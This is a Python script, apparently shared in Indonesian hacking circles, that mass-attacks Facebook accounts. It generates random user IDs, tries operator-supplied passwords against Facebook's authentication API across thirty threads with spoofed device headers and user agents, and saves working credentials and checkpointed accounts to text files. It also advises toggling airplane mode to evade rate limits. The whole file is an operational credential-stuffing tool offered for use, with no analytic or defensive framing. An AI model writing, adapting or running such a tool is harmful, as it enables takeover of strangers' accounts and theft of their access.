import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import time as kontol
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from datetime import datetime

try:
        import rich
except ImportError:
        print('* sedang menginstall modul rich')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        print('* sedang menginstall modul stdiomask')
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('* sedang menginstall modul requests & mechanize')
	os.system('pip install requests && pip install mechanize')

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor

W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'

logo = """\033[1;92m           ▂▂▂▂▂▃▄▅▆▇█▉ꕥ🌼ꕥ██▇▆▅▄▃▂▂▂▂▂


   \033[1;32m          #####   ##      ##  ######
   \033[1;33m         ##   ##  ##      ##  ##
   \033[1;34m         #######  ##      ##  #####
   \033[1;35m         ##   ##  ##      ##  ##
   \033[1;36m         ##   ##  ######  ##  ##

\033[93;1m🔥▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬🔥 
\033[1;37m [\033[0;41;37m▂▂▂▃▄▅▆▇█▉🌼 AUTHOR\033[0;37;41m Alif Nurdin 🌼██▇▆▅▄▃▂▂▂\033[1;37;40m\033[1;32m] \033[1;37;40m     
\033[1;47;40m     ╔═════════════════🎭══════════════════╗
\033[1;37;40m     ║ FACEBOOK    :\033[93;1m➤\033[1;32m AlifXyz78            ║
\033[1;37;40m     ║ INFO SCRIPT :\033[93;1m➤\033[1;32m  FREE                ║
\033[1;37;40m     ║ AUTHOR      :\033[93;1m➤ \033[1;32m Alif Nurdin Afizayen║
\033[1;37;40m     ║ GITHUB      :\033[93;1m➤ \033[1;32m Alif-Xyz            ║
\033[1;47;40m     ╚═════════════════🎭══════════════════╝ """


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print('\033[1;37mSC CRACK RANDOM AKUN\033[0m')
		print("")
		print("%s[%s1%s]%s CRACK RANDOM FB 2008-2009-2010 %s[MAUNYA GITU BROT]"%(P,G,R,Y,B))
		print("\033[1;31m[2] KELUAR(CROT AAAAHHH)")
		__SHO = input("\n\033[0;91m>>> \033[0;92m Pilih 1 Aja Broot \033[0m: ")
		if __SHO in ["", " "]:
			Main()
		elif __SHO in ["1", "01"]:
			self.fbtua()
		else:
			exit()

	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input(" \033[0;95m[👉]\033[0;93m Mau Berapa Id Broot? Limit 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [👉] Berhasil Mengumpukan ☞ \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [👉] Note %s, %sGUNAKAN%s (KOMA) UNTUK PEMISAH INI SC CRACK AKUN LUAR YA BROOOT SALIN SAJA TEKS DI BAWAH"%(G,Y,B,Y))
				print("%s EXAMPLE :%s 989898,1234,12345,123456,1234567,12345678,123456789 "%(G,Y))
				listpass = input("%s [👉] Masukan Sandi :%s "%(G,Y))
				if len(listpass)<=2:
					exit("\n%s [!] SANDI MINNIMAL 3 KARAKTER"%(B))
				print("%s [👉] CRACK MENGGUNAKAN SANDI 👉 [\033[0;91m%s\033[0;93m]"%(G,listpass))
				print("\n%s [👉] HASIL OK DISIMPAN DI 👉 ok.txt"%(Y))
				print("%s [👉] HASIL CP DISIMPAN DI 👉 cp.txt"%(G))
				print("%s [👉] HIDUPKAN DAN MATIKAN MODE PESAWAT SETIAP 5 MENIT\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n[👉] CRACK SELESAI...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(59,119))}.0.{str(random.randint(2500,6999))}.{str(random.randint(99,299))} Safari/537.36 QIHU 360SE"
            "Mozilla/5.0 (Linux; Android {str(random.randint(6,16))}; Lenovo A358t Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(59,119))}.0.{str(random.randint(2500,6999))}.{str(random.randint(99,299))} Mobile Safari/537.36 MxBrowser/4.5.10.1300"
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
            "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
            "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36]"
            "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
            "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36]"
            "Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+]"
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+]"
			"Mozilla/5.0 (Linux; Android 6.0; CAM-L21 Build/HUAWEICAM-L21) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36]"
			"NokiaC3-00/5.0 (07.20) Profil/MIDP-2.1 Konfigurasi/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, seperti Gecko) Safari/420+]"
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1]"
            "Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54]"
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11]"
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6]"
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36]"
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24]"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36]"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2]"
            "Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1]"
            ])
		sys.stdout.write(
			"\r\r %s[👉Alif-Xyz]: %s/%s -➤ \033[0;97m [OK:%s ] \033[0;97m[CP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [SHO-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [SHO-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

try:Main()
except Exception as e:exit(str(e))
